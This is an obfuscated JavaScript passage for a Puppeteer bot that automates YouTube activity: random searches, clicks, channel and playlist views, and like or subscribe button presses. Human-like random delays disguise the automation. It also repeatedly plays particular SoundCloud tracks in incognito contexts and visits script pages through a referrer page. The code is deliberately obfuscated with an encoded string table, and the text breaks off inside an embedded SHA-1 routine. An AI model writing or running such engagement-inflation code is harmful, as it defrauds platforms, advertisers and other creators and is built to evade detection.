const a1 = d,
  a0 = c,
  Z = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0xd7 * 0xf + -0x1fa1 + 0x2c3b))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x26b8 + -0x746 + -0x2dfe * -0x1), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x6861 * -0x1 + -0x14c6 + -0x1 * -0xf257 + (-0x1 * -0x4cd2 + -0xb6c + 0x367 * -0x2) * random()) : await standardWaitForNetIdle(f), await wait(0xd84 + 0x224d + 0x1c49 * -0x1 + (0x3405 + 0x39 * 0x158 + -0x1 * 0x598d) * random()), 0xba1 * 0x1 + -0x1 * -0xaf1 + -0x1691;
}
async function standardWaitForNetIdle(f) {
  const R = b;
  return await wait(0x1 * -0xf11 + -0x219e + 0x4437), await f['waitForNet' + R(0x1a, '&zCq')]({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x79 * 0xf + -0x67 * 0x5d + 0x2c83;
}
async function randomWait() {
  return await wait(-0x2 * -0x895 + 0x3a * 0xb + -0x20 + (0xc3 * -0x17 + -0xd1b + 0x6 * 0x85c) * random()), -0x22 * 0x22 + 0xa93 * -0x3 + 0x1 * 0x243e;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x2c * -0xde + 0xa00 + 0x1c28 * 0x1, 0xec * -0x2 + -0xedd + 0x10bc), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x2e24 * -0x8 + -0x7cda + -0x9e6) * getRandomInt(0x17 * 0x25 + -0x1ba6 * -0x1 + 0x1 * -0x1ef7, 0x1 * -0x895 + -0x1 * 0x149 + 0x1 * 0x9e3), h)), 0xc7 * -0x7 + 0x1 * -0x9fe + 0x7b8 * 0x2;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x25be + 0x1f * -0x4a + 0x2eb4;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x1092 * 0x1 + 0x1 * 0x4b + -0x2 * -0x824]['split']('\x20');
    for (let k = -0x1b0d + -0x21f3 + -0x8 * -0x7a0; k < i['length']; k += -0x3 * 0x49d + -0x19bb + 0x2794)
      j += i[k] * h[i[k + (0x137 * 0xf + 0x9 * 0x43f + -0x1 * 0x386f)]];
    return j;
  });
}
async function anchorAndView(f) {
  const S = b;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels[S(0x1c, 'xoLG')]()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const T = c,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x2 * -0x782 + 0x1832 * 0x1 + -0x1 * 0x2730)['map'](l => Array[T(0xa)](l['children']))['flat'](0x106 * -0x1 + -0x1b7 * 0x1 + 0x2be)['map'](l => l['childNodes'][-0x1 * 0xfbd + -0xffd * -0x1 + 0x7 * -0x9]['childNodes'][0x106a + -0x417 + -0xc53]['childNodes'][-0x46 * -0x6b + -0x14 * -0x1d1 + -0x4195]['childNodes'][0x1d8d + 0x1157 + -0x2ee4]['childNodes'][0x1 * 0x2605 + 0x15ca + 0xa * -0x5fb]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1b * 0x97 + -0x2197 + 0x1 * 0x1592, 0x22bd * 0x1 + -0x33 * 0x1d + -0x22 * 0x47)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x1 * 0x48fc + -0xc + -0x4e0 * -0x1b);
  const h = await getMaxTime(f),
    i = Math['min']((0x70d7 + -0x11c66 + -0x1 * -0x195ef) * getRandomInt(0x220e + -0x2a3 * 0x1 + -0xb * 0x2db, 0x3e1 * -0x6 + -0x1 * 0x24cb + 0x3c16 * 0x1), h);
  return await wait(i), 0x1cf9 + -0x1ad7 * -0x1 + -0x37cf;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x1 * -0xe4b + 0x7fc + -0x1647]['children'][-0x2309 * -0x1 + -0x1 * -0x2415 + 0x1 * -0x471e]['children'][0x22a8 + -0x1f6 + -0x20b2]['children'][0x12d8 + -0x17ba + -0x1 * -0x4e2]['children'][0x1128 + -0xe5 + 0x17 * -0xb5]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x5cf * -0x4 + -0xeb * -0x1 + 0x1652;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0xd * 0x233 + -0x1b9f * 0x1 + -0x94 + (-0x3 * -0xc2c + 0x1eaf + -0x4301) * random()
  }), await wait(0x8f2 + 0x2 * -0x883 + 0x18 * 0x6b + (-0x11 * 0x18d + -0x2a5 + 0x1e2e) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x21f1 * -0x1 + 0x65 * 0x4e + -0x3 * -0x10f]['childNodes'][0x1fc1 + -0x1 * 0x1b1d + 0x1 * -0x4a3]['childNodes'][-0x2308 + -0xde9 + 0x30f2]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0xdd6 + 0x2222 + 0x1d * -0xb3]['childNodes'][-0x1ed1 + -0xc7 * -0x2b + -0x14e * 0x2]['childNodes'][0x666 + 0x16b2 + -0x1d16]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0xcda + 0xe * 0x83 + -0x1403),
          r = 0x1267 + 0x1de7 * -0x1 + 0x4 * 0x2e0;
        for (let u = 0xbe0 + 0x1045 + -0x1c25; u < q['length']; u += 0x2af + 0x11b0 * -0x1 + 0x3f * 0x3d)
          r += q[u] * k[q[u + (0x19 * 0x1 + 0x320 + -0x8 * 0x67)]];
        return r;
      }(n);
  });
  await wait((-0x3755 * -0x2 + -0x1a8 + 0x326a * -0x1) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x1b57 + -0x75f5 * 0x2 + 0x5897 * 0x5) * getRandomInt(-0xa7 * -0x2f + -0x63f * 0x3 + -0xbeb, -0x748 * -0x1 + 0x2cc * 0x6 + 0x3 * -0x802), h + (-0x373 * 0x9 + 0x23 * 0x1 + 0x3270));
  return await wait(i), 0xb62 + -0x1 * -0x16af + -0x1108 * 0x2;
}
async function keyWatch(f) {
  const V = d,
    U = b;
  log(U(0x14, '%Ds]') + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x251d + 0xcc2 + -0x31df * 0x1), log('clicking..' + '.'), await f[V(0x15)]('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x2ea + 0x1377 + -0x4d5 * 0x1 + (-0x276 * -0x9 + -0x1 * 0x12cb + 0x8d) * Math['random']());
    });
  }, -0x1 * -0x20fb + -0x1b0a * -0x1 + 0x4ab * -0x7);
  await wait(0x53d * 0x7e + -0x42031 + 0x1f * 0x3295);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x5 * -0x2462 + 0x3 * 0x7a9d + 0x1 * -0x13b61) * getRandomInt(-0x31 * 0xb4 + 0x1164 + -0x1114 * -0x1, -0x35 * 0x26 + -0x9 * -0x1f4 + -0x99d)), clearInterval(h), 0x1445 + -0x54 * -0x65 + -0x3568;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x24d4 + -0x20 * 0x1d + 0x2874;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0xfc6 + 0x25 * 0x1 + 0xfa2;
    await randomWait();
  }
  return -0xf * -0x6a + -0x1ffa * -0x1 + -0x262f;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x163e + -0x2 * 0x670 + 0x5 * 0x706);
    let h = e[f];
    if (b['xhypsK'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x36c * 0xb + -0x15c2 + 0x3b66, s, t, u = -0x1 * -0x40 + -0x5 * 0x4c + 0x13c; t = n['charAt'](u++); ~t && (s = r % (0x11cd + -0x1a79 + 0x8b0) ? s * (-0x746 + -0x16ea * 0x1 + 0x1e70) + t : t, r++ % (-0x1 * 0x376 + -0x1d * -0x139 + -0x1 * 0x1ffb)) ? p += String['fromCharCode'](0x6d8 + 0x665 * -0x1 + 0x46 * 0x2 & s >> (-(0x2ad * -0x2 + 0x844 * -0x1 + 0xda0) * r & -0x1 * -0xaba + 0x17 * 0x9b + 0x18a1 * -0x1)) : 0x239d + -0x9e6 + -0x19b7) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1cee + 0x246 + -0x1f34, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x256b + -0x16f * -0x11 + 0xd1c))['slice'](-(-0x2 * -0x895 + 0x3a * 0xb + -0x13a6));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0xc3 * -0x17 + -0xd1b + 0xa * 0x310,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x22 * 0x22 + 0xa93 * -0x3 + 0x1 * 0x243d; u < 0x2c * -0xde + 0xa00 + 0x1d28 * 0x1; u++) {
          p[u] = u;
        }
        for (u = 0xec * -0x2 + -0xedd + 0x10b5; u < -0x177 * -0x15 + -0xa68 + -0x135b; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x17 * 0x25 + -0x1ba6 * -0x1 + 0x1 * -0x1df9), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1 * -0x895 + -0x1 * 0x149 + 0x1 * 0x9de, q = 0xc7 * -0x7 + 0x1 * -0x9fe + 0xf6f * 0x1;
        for (let v = -0x25be + 0x1f * -0x4a + 0x2eb4; v < n['length']; v++) {
          u = (u + (-0x1092 * 0x1 + 0x1 * 0x4b + -0x2 * -0x824)) % (-0x1b0d + -0x21f3 + -0x10 * -0x3e0), q = (q + p[u]) % (-0x3 * 0x49d + -0x19bb + 0x2892), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x137 * 0xf + 0x9 * 0x43f + -0x8 * 0x6ee)]);
        }
        return t;
      };
      b['kKWzrE'] = m, c = arguments, b['xhypsK'] = !![];
    }
    const j = e[-0x2 * -0x782 + 0x1832 * 0x1 + -0x1 * 0x2736],
      k = f + j,
      l = c[k];
    return !l ? (b['uTsXrQ'] === undefined && (b['uTsXrQ'] = !![]), h = b['kKWzrE'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function fetchRandomSC() {
  return Math['random']() <= 0xd0f + 0x2378 + -0x1 * 0x3087 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x1 * -0x47 + -0x1e2e + -0x3 * -0xa27 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function a() {
  const bq = [
    'WPrdpfJcSqddKJv5W6e',
    'slice',
    'DMvYC2LVBNm',
    'zs8Q',
    'W5ddKrmBWOXdm8kdjYy',
    'Agv4',
    'CMvJDa',
    'WReCW5fzWOxcK8ozWQupvW',
    'CxvLCNLtzwXLyW',
    'xSoAW7mbW5hcNMDZW57dSa',
    'zNjVBq',
    'lMLVihvWzgf0zq',
    'bSkGWRxcR3v+WPVcL8ogWRu',
    'FuXSW5j4E8oeuCo5W7G',
    'Ahr0Chm6lY9JBW',
    'BMCSC3vUBNL2mG',
    'W4i5W4uzW4CDkmk3cWa',
    'WRFcLYRcL8kBWQxdQ8oNwHO',
    'zwfZDcbPBIbOAq',
    'B28TAw8TA3j1BG',
    'gCkVW4XVureZW4ldJKC',
    'click',
    'rf3dOCkkW5VdOJ8OfCoK',
    'W7NcKSoFEapdVsiqqLq',
    'fx5WEmk4',
    'rg/en/scri',
    'WPPNWODkWQbjASoI',
    'WRpcJIBdNSov',
    'xSoCWRiaW5ddNa',
    'AgvHzgvYCW'
  ];
  a = function() {
    return bq;
  };
  return a();
}
async function runGFModule(f, h) {
  async function i() {
    const X = d;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x894 + -0x1 * 0x1b73 + 0x12df * 0x1 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x8de + -0x2140 + -0x1 * -0x2a1e;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const W = c;
          let n = document[W(0x8) + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x725b + -0x617d + 0x9eea * 0x1 + getRandomInt(0x378a + -0x47cf + 0x4add, 0x1919 * 0x7 + 0xbd05 + -0xd9 * 0x124));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0xb * -0x259 + -0x241c + -0x36e * -0x3), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x620 + -0x36 * 0x22 + 0x10c;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v[X(0x1)](0x1fc7 + -0x839 * 0x1 + -0x178e, -0x2052 + 0x1b94 + 0x278 * 0x2)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x442 + -0x2670 + 0x1e * 0x1af + floor((0x1 * 0xce3 + -0x37a * 0x7 + 0xf5b) * random()))), log('p2'), log(await s['evaluate'](() => {
        const Y = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process[Y(0x2)]['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x11a89 * -0xc4f6 + 0xb6183d10 + 0xa3482696),
          0xf40ef9 + 0x67 * -0x236d4 + -0x1 * -0x700053,
          0x1131 + 0xb1 * -0x8d + -0x4 * -0x3413,
          0x573 + -0x1c1f + 0x172c
        ], y = [
          0x37 * -0x7a + 0x1cae + -0x260,
          0x8e4 * -0x2 + -0x17b * 0xb + 0x1 * 0x2221,
          0x1 * 0x73b + -0x1d3b + 0x1608,
          -0x131 * -0xd + 0x1b75 + -0xef * 0x2e
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x1945 + 0x22b9 + -0x973)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x2294 + -0x25a0 + -0x120d * -0x4; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0xb01 + -0x972 + 0x5 * 0x417) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x1804 + 0x1 * 0x22a4 + -0xaa0] = A[0x20e7 + -0x1229 + -0xeae] = A[0xeaa + 0x12f1 + -0x219a] = A[-0x2073 * 0x1 + -0x16a9 * -0x1 + 0x9cc] = A[0x127 + 0x4d * -0x4f + -0x1 * -0x169f] = A[-0x12b * 0x1 + 0xcf * -0x2b + 0x27 * 0xec] = A[-0x23b0 + 0x1f6 * 0xe + 0x841] = A[-0x2166 + 0xb56 + 0x101 * 0x16] = A[0x1 * 0xe32 + -0x1 * -0x416 + 0x1 * -0x1241] = A[0x1 * 0x877 + 0x1bfa + -0x2469] = A[-0x2 * -0xb93 + 0x9fe + -0x211b] = A[0x6 * -0x32d + -0x1a23 + 0x2d3b] = A[-0x5 * -0x6c7 + -0xbcd + -0x160b] = A[-0x2d5 + 0x1 * 0x18d0 + -0x15ef] = A[-0x195 + 0x1e2 * 0x7 + -0xb8c] = A[0x16ec + 0x4af * -0x3 + -0x8d1] = A[0xb9d + 0xa21 + -0x15af] = -0x51f + -0x49 * -0x53 + 0x1 * -0x128c, this['blocks'] = A) : this['blocks'] = [
                0x2021 + 0x1007 + 0x1 * -0x3028,
                0x37f * 0x9 + 0x671 + -0x8 * 0x4bd,
                -0x8b * -0x36 + 0x563 * 0x3 + 0x3 * -0xf29,
                -0x5 * -0x3e5 + 0xa4 * -0x6 + -0xfa1,
                0x12c5 * -0x2 + -0x1af3 + 0x407d,
                -0x1dba + 0x10a2 + 0x1a3 * 0x8,
                0xc0c + 0x5f6 + -0x5 * 0x39a,
                -0x1ca3 * -0x1 + -0x1 * -0x882 + -0x2525,
                -0x1553 + 0x5c * -0x42 + 0x2d0b,
                0x2 * 0x364 + 0x219 * -0x2 + -0x14b * 0x2,
                -0x578 + -0x116f + 0x16e7,
                -0x4a * -0x4 + -0x1e2 * 0x1 + 0x1f * 0x6,
                -0x206b + 0x1a17 + 0x87 * 0xc,
                -0x2 * -0x925 + -0x1186 + 0x2 * -0x62,
                0xdae + -0x4b + -0xd63,
                -0xbfb + 0x1 * 0x1fc7 + 0x7 * -0x2d4,
                -0x1 * 0xe21 + 0xc0 * -0x23 + 0x2861
              ], this['h0'] = -0x1 * 0xa8ec4607 + -0x75c7317a + 0x185f89a82, this['h1'] = 0x4c9 * 0x16e3ef + 0x2 * -0x498be34d + 0x1155cbf7c, this['h2'] = -0x1 * -0x20f58601 + 0x646e2340 + 0xa3 * 0x1e601f, this['h3'] = -0x16768b40 + -0x746b9 * -0x1b7 + 0x1a2e9877, this['h4'] = 0xc32b23 * 0xad + -0x25b654f8 + 0xe854b77 * 0x7, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x1 * 0x1ed6 + 0x22e7 + -0x411, this['finalized'] = this['hashed'] = 0x7f * 0x3e + 0x1dc5 + -0xc1b * 0x5, this['first'] = -0x1e55 + 0x9 * 0x19 + 0x1d75;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x4c1 * 0x3 + 0x860 + 0x5e3, O = J['length'] || 0x463 * -0x4 + 0x1 * -0x2531 + 0x36bd, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x5 * -0x3ec + 0x11e3 + -0x257f, P[-0x1efb + -0x1eb * 0x2 + -0x1 * -0x22d1] = this['block'], P[0x475 + -0x1bfb + 0x1796] = P[-0x1 * 0x157a + 0x1de2 + -0x867] = P[0x965 + -0x3 * -0x1f4 + 0x3 * -0x515] = P[0x1e13 * -0x1 + -0x1a6b + 0x523 * 0xb] = P[-0x511 * -0x1 + -0x2182 + 0x5b1 * 0x5] = P[-0x1 * -0x3f6 + -0x1b52 + 0x1761] = P[-0x1 * 0x1c67 + 0x11f1 + -0xf4 * -0xb] = P[-0x1748 + 0x15 * -0x11f + 0x2eda] = P[-0x682 + -0xd19 + 0x1c9 * 0xb] = P[0x169 * 0x17 + 0x1 * -0x206d + 0x7] = P[0x46c * 0x7 + 0x1bfc + 0x86a * -0x7] = P[0x1420 + -0x19db + 0x5c6 * 0x1] = P[-0x6d * -0x47 + 0xcb * -0x13 + -0xf1e] = P[-0x1 * 0x238 + -0x2bd + -0x2 * -0x281] = P[0x6 * -0x251 + 0x1841 * -0x1 + 0x2635] = P[-0x1 * -0x166b + 0xf8 * 0xc + -0x87f * 0x4] = 0x10e8 * -0x2 + -0x41e * 0x2 + -0x1 * -0x2a0c), K) {
                    for (N = this['start']; M < O && N < 0x34 * -0x55 + 0x12c9 + 0xd * -0x19; ++M)
                      P[N >> 0x158f * -0x1 + 0x1 * 0x189b + -0x30a * 0x1] |= J[M] << y[-0x1 * -0x2377 + 0x20cf + -0x4443 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x1880 + -0x1 * 0x1dda + 0x369a; ++M)
                      (L = J['charCodeAt'](M)) < -0x1da5 * -0x1 + -0x1f6b * 0x1 + -0x61 * -0x6 ? P[N >> 0x18d * 0x5 + 0x6 * -0x7b + -0x4dd] |= L << y[0x1 * 0x8df + 0x33a + -0xc16 & N++] : L < -0x1adc + -0x2306 + -0x6fd * -0xa ? (P[N >> -0xaae + -0xd05 + 0x17b5] |= (-0x22 * 0x47 + 0x27b * 0x5 + -0x239 | L >> -0x1 * -0x257e + 0x1ca5 + -0x421d) << y[0x1772 + 0x1cd7 + -0x3446 * 0x1 & N++], P[N >> 0x21f8 + -0x1e07 + -0x3ef] |= (-0x1 * 0xce9 + 0xc07 * 0x1 + 0x3b * 0x6 | -0x5b * 0x1 + 0x171 + -0xd7 & L) << y[0x3f5 * 0x5 + -0x1758 + -0x1c9 * -0x2 & N++]) : L < 0x178d6 + -0x8e18 * 0x1 + -0x12be || L >= 0x1d7 * -0xd7 + -0x2 * -0x625a + -0x1a6dd * -0x1 ? (P[N >> -0x647 + -0x7f8 + -0x59 * -0x29] |= (0xeec + -0x1883 + 0xa77 | L >> -0x1696 + -0x203 + 0x18a5) << y[-0x39 * -0x86 + 0x68 * -0x1 + -0x1d6b & N++], P[N >> 0x20ef + -0xbd * 0x12 + -0x1c9 * 0xb] |= (0x3 * -0x25 + -0x1e6b + 0x2 * 0xfad | L >> -0x943 * 0x3 + 0x73 * -0x1f + 0x29bc & 0x182e * 0x1 + -0xf1e * -0x1 + -0x270d) << y[0x86 + 0x2 * 0x1343 + -0x1 * 0x2709 & N++], P[N >> -0x23aa + 0xe7 * -0x23 + 0x779 * 0x9] |= (-0x6c8 + -0xf17 * -0x1 + -0x7cf | -0x3 * -0x8b + 0x10db + -0x17 * 0xcb & L) << y[0xf * 0xc7 + 0x20a3 * 0x1 + 0xec3 * -0x3 & N++]) : (L = -0xb78d + 0xdbd * 0x7 + 0x15762 + ((-0x2b * 0x14 + 0x269 * -0x3 + 0xe96 * 0x1 & L) << -0x448 * 0x1 + 0x33 * -0x6d + 0x1a09 * 0x1 | -0x137b + -0x285 + -0x1 * -0x19ff & J['charCodeAt'](++M)), P[N >> 0x31c + -0x1fcc + 0x1cb2 * 0x1] |= (-0x1 * 0x773 + -0x196e + 0x313 * 0xb | L >> 0x1e43 + 0x7c4 * 0x2 + -0x2db9) << y[-0x12fe * -0x1 + -0x1 * 0x851 + -0xaaa & N++], P[N >> 0x234 * -0x4 + 0x3 * -0x3ac + 0x13d6] |= (-0xb37 + 0xe6e + -0x2b7 | L >> 0x33b + 0x1ee8 + -0x2217 * 0x1 & 0x1e4a + -0x1 * -0x1bc9 + -0x1cea * 0x2) << y[0x2071 + 0x65e * 0x1 + -0x26cc & N++], P[N >> -0x1870 + 0x1be1 + -0x36f] |= (-0x119f + 0x165 + 0x85d * 0x2 | L >> -0x6f * -0x1f + 0x165a + -0x23c5 & -0x250f + 0x34 * 0x58 + 0x136e) << y[0x86 * 0x9 + 0xc2 * 0x11 + 0x283 * -0x7 & N++], P[N >> -0x2bd * 0x1 + 0xa9 * 0x26 + 0x12d * -0x13] |= (-0x3b * 0x53 + 0xf1a * 0x2 + -0x1 * 0xa93 | 0xfb0 + -0x1b2d * -0x1 + -0x2a9e & L) << y[0x46f + 0x26ea + -0x2b56 & N++]);
                  }
